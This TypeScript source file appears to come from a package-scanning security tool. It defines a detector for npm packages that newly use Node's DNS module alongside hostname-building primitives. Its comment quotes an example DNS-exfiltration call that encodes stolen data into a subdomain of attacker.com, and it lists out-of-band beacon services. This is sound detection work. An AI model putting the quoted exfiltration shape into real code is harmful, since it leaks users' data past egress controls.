// port from guarddog:threat-network-dns-exfil
/**
 * NET detector — DNS exfiltration via a constructed / templated hostname.
 *
 * Rationale (audit §1 G-05): the shape `dns.lookup(f"{data}.attacker.com")`
 * or `dns.resolve(\`\${VAR}.beacon\`)` encodes stolen data into a DNS query's
 * subdomain to bypass HTTP egress filters. This is the beaconing shape used
 * by Alex-Birsan-era dependency-confusion probes (Burp Collaborator,
 * `interact.sh`, oastify, dnslog, canarytokens). Neither the existing
 * `net.new-module` (fires on any `dns` import) nor `net-encoded.ts` (fires on
 * base64-encoded URL literals) names this specific shape.
 *
 * DIFFERENCE FROM GUARDDOG'S PORT: the audit proposes AST-level detection —
 * `dns.lookup`/`dns.resolve`/`getaddrinfo` called with a `TemplateLiteral` or
 * `BinaryExpression('+')` argument. vetlock detectors read the
 * FileCapabilities surface — no AST here — so we use the strongest
 * approximation available: fire when a file BOTH imports a DNS module AND
 * exhibits data-composition primitives that indicate a hostname is being
 * built at call time. The corroborating primitives we look for are:
 *
 *   (a) `dynamicCode[].kind === 'char-arithmetic-decoder'` — the file uses
 *       String.fromCharCode + charCodeAt (the classic per-char decoder that
 *       reconstructs a hostname from encoded bytes), OR
 *   (b) at least one `encodedUrls[]` entry — the file decodes a base64/hex
 *       payload that resolves to a URL/hostname, OR
 *   (c) at least one `envAccesses[]` entry with snippet content containing a
 *       DNS-lookup-like callee (`dns.lookup`, `dns.resolve`, `getaddrinfo`,
 *       `gethostbyname`, `nslookup`) — the file reads an env var and passes
 *       it to a DNS primitive on the same source line.
 *
 * We fire in diff-mode when a DNS module is NEWLY imported (not present in
 * `pair.old`) AND at least one of (a)/(b)/(c) is present in `pair.new`.
 * Added-package mode fires whenever the module + a corroborating primitive
 * co-occur — a first-published package that imports `dns` alongside a decoder
 * is signal.
 *
 * Severity WARN, medium confidence. Escalates via runAll() compound rules.
 */

import type { Detector, Finding, FileCapabilities, PackageSnapshot, SnapshotPair } from '@vetlock/core';
import { directionFor } from './direction.js';

const DNS_MODULES = new Set([
  'dns',
  'dns/promises',
  'node:dns',
  'node:dns/promises',
]);

/**
 * A source-line snippet that looks like it invokes a hostname-resolution
 * primitive. We match against the KNOWN callee names that appear in captured
 * `envAccesses[].snippet` and `dynamicCode[].snippet` samples.
 */
const DNS_CALLEE_RE = /\b(?:dns\.(?:lookup|resolve\w*|reverse)|getaddrinfo|gethostbyname|nslookup)\s*\(/;

function hasDnsModule(file: FileCapabilities): boolean {
  for (const mod of file.networkModules) {
    if (DNS_MODULES.has(mod)) return true;
  }
  return false;
}

function collectDnsModules(snap: PackageSnapshot | null): Set<string> {
  const out = new Set<string>();
  if (!snap) return out;
  for (const f of snap.files) {
    for (const mod of f.networkModules) {
      if (DNS_MODULES.has(mod)) out.add(mod);
    }
  }
  return out;
}

/**
 * Corroborating primitives — see module docstring. Returns the human-readable
 * label of the first primitive that fires, or null.
 */
function corroboratingPrimitive(file: FileCapabilities): string | null {
  for (const site of file.dynamicCode) {
    if (site.kind === 'char-arithmetic-decoder') return 'per-char decoder shape (String.fromCharCode + charCodeAt)';
  }
  if (file.encodedUrls.length > 0) {
    return `encoded URL/hostname literal (${file.encodedUrls[0]!.encoding}-encoded)`;
  }
  for (const acc of file.envAccesses) {
    if (acc.snippet && DNS_CALLEE_RE.test(acc.snippet)) {
      return `env-var passed to DNS callee (line ${acc.line})`;
    }
  }
  for (const site of file.dynamicCode) {
    if (site.snippet && DNS_CALLEE_RE.test(site.snippet)) {
      return `dynamic sink co-located with DNS callee (line ${site.line})`;
    }
  }
  return null;
}

export const netDnsTemplatedHostnameDetector: Detector = {
  id: 'net-dns-templated-hostname',
  category: 'NET',
  run(pair: SnapshotPair): Finding[] {
    if (!pair.new) return [];
    const dir = directionFor(pair.old);
    const isAdded = pair.old === null;
    const oldDnsModules = collectDnsModules(pair.old);
    const out: Finding[] = [];

    for (const nf of pair.new.files) {
      if (!hasDnsModule(nf)) continue;
      // Diff-safety: in changed-package mode, only fire when at least ONE dns
      // module in this file is NEW to the package. A file that already used
      // dns.lookup in v1 and still uses it in v2 is not a diff-frame delta.
      if (!isAdded) {
        const newDnsHere = nf.networkModules.filter(
          (m) => DNS_MODULES.has(m) && !oldDnsModules.has(m),
        );
        if (newDnsHere.length === 0) continue;
      }
      const primitive = corroboratingPrimitive(nf);
      if (!primitive) continue;

      out.push({
        detector: 'net.dns-templated-hostname',
        category: 'NET',
        package: pair.new.name,
        from: dir.from,
        to: pair.new.version,
        direction: dir.direction,
        severity: 'WARN',
        confidence: isAdded ? 'low' : 'medium',
        message: isAdded
          ? `Newly-installed package imports Node DNS module in ${nf.path} alongside a ${primitive} — constructed-hostname exfil shape.`
          : `Package started using Node DNS module in ${nf.path} alongside a ${primitive} — constructed-hostname exfil shape.`,
        evidence: [
          {
            file: nf.path,
            line: 1,
            snippet: `dns module + ${primitive}`.slice(0, 240),
          },
        ],
        provenance: [],
      });
    }

    return out;
  },
};

/** Exported for tests. */
export { DNS_MODULES, DNS_CALLEE_RE, corroboratingPrimitive };
